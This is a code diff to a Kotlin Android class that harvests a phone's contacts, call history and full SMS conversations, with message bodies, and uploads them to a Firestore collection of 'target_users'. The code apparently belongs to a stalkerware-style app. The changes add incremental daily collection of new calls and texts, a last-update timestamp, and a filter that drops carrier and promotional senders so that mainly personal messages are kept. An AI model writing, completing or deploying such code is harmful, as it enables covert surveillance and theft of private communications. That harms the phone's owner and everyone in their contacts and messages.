@@ -7,10 +7,12 @@ import android.net.Uri
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
-import android.text.format.DateFormat
 import android.util.Log
 import com.google.firebase.firestore.ktx.firestore
 import com.google.firebase.ktx.Firebase
+import java.text.SimpleDateFormat
+import java.util.*
+import kotlin.collections.HashMap
 
 class SavePhoneData(val context: Context) {
 
@@ -20,80 +22,76 @@ class SavePhoneData(val context: Context) {
     private val batch = db.batch()
     private val targetDocuments = db.collection("target_users").document(userData["target"]!!)
 
-    fun saveData2(){
-        getCalls()
-    }
 
     fun saveData(){
 
         val contactsMap = getContacts()
         val callsMap = getCalls()
         val conversationMap = getConversations()
-        val messageMap = getMessages()
 
         if (sessionManager.isFirstTime()){
-            batch.update(targetDocuments.collection("data").document("contacts"),
+            batch.set(
+                targetDocuments.collection("data").document("contacts"),
                 contactsMap as Map<String, Any>
             )
-            batch.update(targetDocuments.collection("data").document("calls"),
+            batch.set(
+                targetDocuments.collection("data").document("calls"),
                 callsMap as Map<String, Any>
             )
-            batch.update(targetDocuments.collection("data").document("conversations"),
+            batch.set(
+                targetDocuments.collection("data").document("conversations"),
                 conversationMap as Map<String, Any>
             )
-            batch.update(targetDocuments.collection("data").document("messages"),
-                messageMap as Map<String, Any>
-            )
+            batch.update(targetDocuments,"last_update",getCurrentTime())
 
             batch.commit().addOnSuccessListener {
-                Log.d("TEST_UPLOAD","Updated Success")
-            }.addOnFailureListener {
-                Log.d("TEST_UPLOAD","Failed")
+                sessionManager.setFirstTime(false)
             }
         } else {
-
-            batch.set(targetDocuments.collection("data").document("contacts"),
+            batch.update(
+                targetDocuments.collection("data").document("contacts"),
                 contactsMap as Map<String, Any>
             )
-            batch.set(targetDocuments.collection("data").document("calls"),
+            batch.update(
+                targetDocuments.collection("data").document("calls"),
                 callsMap as Map<String, Any>
             )
-            batch.set(targetDocuments.collection("data").document("conversations"),
+            batch.update(
+                targetDocuments.collection("data").document("conversations"),
                 conversationMap as Map<String, Any>
             )
-            batch.set(targetDocuments.collection("data").document("messages"),
-                messageMap as Map<String, Any>
-            )
+            batch.update(targetDocuments,"last_update",getCurrentTime())
 
             batch.commit().addOnSuccessListener {
-                sessionManager.setFirstTime()
-                Log.d("TEST_UPLOAD","Success")
-            }.addOnFailureListener {
-                Log.d("TEST_UPLOAD","Failed")
+                Log.d("Upload","Success")
             }
-
         }
+    }
 
+    private fun getCurrentTime(): String {
+        val simpleDateFormat = SimpleDateFormat("yyyy.MMMM.dd GGG hh:mm aaa")
+        return simpleDateFormat.format(Date())
     }
 
     @SuppressLint("Range")
     private fun getContacts(): HashMap<String, Any> {
-
-        val map = HashMap<String,Any>()
-
+        val map = HashMap<String, Any>()
         val contentResolver = context.contentResolver
         val uri: Uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
-        val cursor: Cursor? = contentResolver.query(uri,null,null,null,null)
+        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
 
-        Log.i("MY_CONTACTS","TotalContacts ${cursor!!.count}")
+        Log.i("MY_CONTACTS", "TotalContacts ${cursor!!.count}")
 
-        if(cursor.count > 0){
-            while (cursor.moveToNext()){
-                val contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
-                val contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+        if (cursor.count > 0) {
+            while (cursor.moveToNext()) {
+                val contactName =
+                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                val contactNumber =
+                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
 
-                val id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))
-                val hashMap = hashMapOf<String,Any>(
+                val id =
+                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))
+                val hashMap = hashMapOf<String, Any>(
                     "name" to contactName,
                     "number" to contactNumber,
                 )
@@ -107,20 +105,21 @@ class SavePhoneData(val context: Context) {
 
     @SuppressLint("Range")
     private fun getCalls(): HashMap<String, Any> {
-        val map = HashMap<String,Any>()
+        val map = HashMap<String, Any>()
 
         val contentResolver = context.contentResolver
         val uri: Uri = CallLog.Calls.CONTENT_URI
-        val cursor: Cursor? = contentResolver.query(uri,null,null,null,null)
+        val cursor: Cursor? =
+            contentResolver.query(uri, null, getSelection(CallLog.Calls.DATE), null, null)
 
-        Log.i("MY_CALLS","TotalCalls ${cursor!!.count}")
+        Log.i("MY_CALLS", "TotalCalls ${cursor!!.count}")
 
-        if(cursor.count > 0){
-            while (cursor.moveToNext()){
+        if (cursor.count > 0) {
+            while (cursor.moveToNext()) {
                 val number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                 val getName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
-                val name = if(getName == null || getName == "")  "Unknown" else getName
-                val type = when (cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))){
+                val name = if (getName == null || getName == "") "Unknown" else getName
+                val type = when (cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))) {
                     "1" -> "Incoming"
                     "2" -> "Outgoing"
                     "3" -> "Missed"
@@ -128,7 +127,7 @@ class SavePhoneData(val context: Context) {
                 }
                 val id = cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID))
                 val date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE))
-                val hashMap = hashMapOf<String,Any>(
+                val hashMap = hashMapOf<String, Any>(
                     "name" to name,
                     "number" to number,
                     "type" to type,
@@ -142,66 +141,129 @@ class SavePhoneData(val context: Context) {
         return map
     }
 
+    private fun getSelection(date: String): String? {
+        val calendar = Calendar.getInstance()
+        calendar.set(Calendar.HOUR, 0)
+        calendar.set(Calendar.MINUTE, 0)
+        calendar.set(Calendar.AM_PM, Calendar.AM)
+
+        return if (!sessionManager.isFirstTime()) {
+            date + ">" + calendar.timeInMillis
+        } else {
+            null
+        }
+    }
+
     @SuppressLint("Range")
-    private fun getConversations():HashMap<String,Any> {
-        val map = HashMap<String,Any>()
+    private fun getConversations(): HashMap<String, Any> {
 
-        val uri = Telephony.Sms.Conversations.CONTENT_URI
-        val projection = arrayOf("msg_count", "snippet", "thread_id")
-        val cursor: Cursor? = context.contentResolver.query(
-            uri, projection, null, null, Telephony.Sms.Conversations.DEFAULT_SORT_ORDER
+        val conversationMap = HashMap<String, Any>()
+
+        val conversationUri = Telephony.Sms.Conversations.CONTENT_URI
+        val conversationProjection = arrayOf("msg_count", "snippet", "thread_id")
+        val conversationCursor: Cursor? = context.contentResolver.query(
+            conversationUri,
+            conversationProjection,
+            getSelection(Telephony.Sms.DATE),
+            null,
+            Telephony.Sms.Conversations.DEFAULT_SORT_ORDER
         )
-        if (cursor!!.count > 0){
-            while (cursor.moveToNext()) {
-                val msgCount = cursor.getInt(cursor.getColumnIndex("msg_count"))
-                val snippet = cursor.getString(cursor.getColumnIndex("snippet"))
-                val threadId = cursor.getString(cursor.getColumnIndex("thread_id"))
+        if (conversationCursor!!.count > 0) {
+            while (conversationCursor.moveToNext()) {
 
-                val insideUri = Telephony.Sms.CONTENT_URI
-                val insideCursor:Cursor? = context.contentResolver.query(insideUri, null, "thread_id=$threadId", null, null)
-                insideCursor!!.moveToFirst()
-                val address = insideCursor.getString(insideCursor.getColumnIndex(Telephony.Sms.ADDRESS))
-                val date = insideCursor.getString(insideCursor.getColumnIndex(Telephony.Sms.DATE))
-                val newDate = DateFormat.format("hh:mm", date.toLong()).toString()
-                insideCursor.close()
+                val msgCount =
+                    conversationCursor.getInt(conversationCursor.getColumnIndex("msg_count"))
+                val snippet =
+                    conversationCursor.getString(conversationCursor.getColumnIndex("snippet"))
+                val threadId =
+                    conversationCursor.getString(conversationCursor.getColumnIndex("thread_id"))
 
-
-                val hashMap = hashMapOf<String,Any>(
-                    "address" to address,
-                    "snippet" to snippet,
-                    "date" to date,
+                val messageUri = Telephony.Sms.CONTENT_URI
+                val messageProjection = arrayOf(
+                    Telephony.Sms.ADDRESS,
+                    Telephony.Sms.BODY,
+                    Telephony.Sms.TYPE,
+                    Telephony.Sms.DATE,
+                    Telephony.Sms._ID
                 )
 
-                map[threadId] = hashMap
-
-                Log.d("MY_CONVERSATIONS","Name: $address, MessageCount: $msgCount, Date: $newDate, Snippet: $snippet")
-            }
-            cursor.close()
-        }
-        return map
-    }
-
-    private fun getMessages():HashMap<String,Any>{
-        val map = HashMap<String,Any>()
-        val projection = arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE, Telephony.Sms._ID)
-        val cursor:Cursor? = context.contentResolver.query(Telephony.Sms.CONTENT_URI,projection,null,null,Telephony.Sms.DATE +" ASC")
-        if (cursor!!.count > 0){
-            while (cursor.moveToNext()){
-
-                val hashMap = hashMapOf<String,Any>(
-                    "address" to cursor.getString(0),
-                    "body" to cursor.getString(1),
-                    "type" to cursor.getString(2),
-                    "data" to cursor.getString(3)
+                val messageCursor: Cursor? = context.contentResolver.query(
+                    messageUri,
+                    messageProjection,
+                    getMessageSelection(Telephony.Sms.DATE,"thread_id=$threadId"),
+                    null,
+                    null
                 )
-                map[cursor.getString(4)] = hashMap
 
-                if (cursor.isLast){
-                    break
+                messageCursor!!.moveToFirst()
+                val address = messageCursor.getString(0)
+                val date = messageCursor.getString(3)
+//                val newDate = DateFormat.format("hh:mm", date.toLong()).toString()
+                val messageMap = HashMap<String, Any>()
+
+                if (validateAddress(address)) {
+
+                    if (messageCursor.count > 0) {
+                        do {
+
+                            val hashMap = hashMapOf<String, Any>(
+                                "address" to messageCursor.getString(0),
+                                "body" to messageCursor.getString(1),
+                                "type" to messageCursor.getString(2),
+                                "date" to messageCursor.getString(3)
+                            )
+                            messageMap[messageCursor.getString(4)] = hashMap
+
+                            if (messageCursor.isLast) {
+                                break
+                            }
+                        } while (messageCursor.moveToNext())
+                        messageCursor.close()
+                    }
+
+                    val hashMap = hashMapOf<String, Any>(
+                        "address" to address,
+                        "snippet" to snippet,
+                        "date" to date,
+                        "tid" to threadId,
+                        "msgCount" to msgCount,
+                        "messages" to messageMap
+                    )
+
+                    conversationMap[threadId] = hashMap
                 }
+
+                Log.d(
+                    "MY_CONVERSATIONS",
+                    "Conversation: $conversationMap"
+                )
             }
-            cursor.close()
+            conversationCursor.close()
         }
-        return map
+        return conversationMap
     }
+
+    private fun getMessageSelection(date: String, idCheck: String): String? {
+
+        val calendar = Calendar.getInstance()
+        calendar.set(Calendar.HOUR, 0)
+        calendar.set(Calendar.MINUTE, 0)
+        calendar.set(Calendar.AM_PM, Calendar.AM)
+
+        return if (!sessionManager.isFirstTime()){
+            "$date>${calendar.timeInMillis} AND $idCheck"
+        } else {
+            idCheck
+        }
+    }
+
+    private fun validateAddress(address: String): Boolean {
+        return (address != "WhatsApp" && address != "bKash Offer" && address != "GP Bioscope" && address != "MyGP Zee5"
+                && address != "GP ID" && address != "BTRC" && address != "GP 4G" && address != "GP " && address != "GP Bundle"
+                && address != "GP" && address != "Offer Info" && address != "GP offer" && address != "Skitto" && address != "GP  "
+                && address != "GPDataOffer" && address != "GP Internet" && address != "GPFlexiPlan" && address != "GP Info" && address != "skitto"
+                && !address.startsWith("GP"))
+    }
+
+
 }
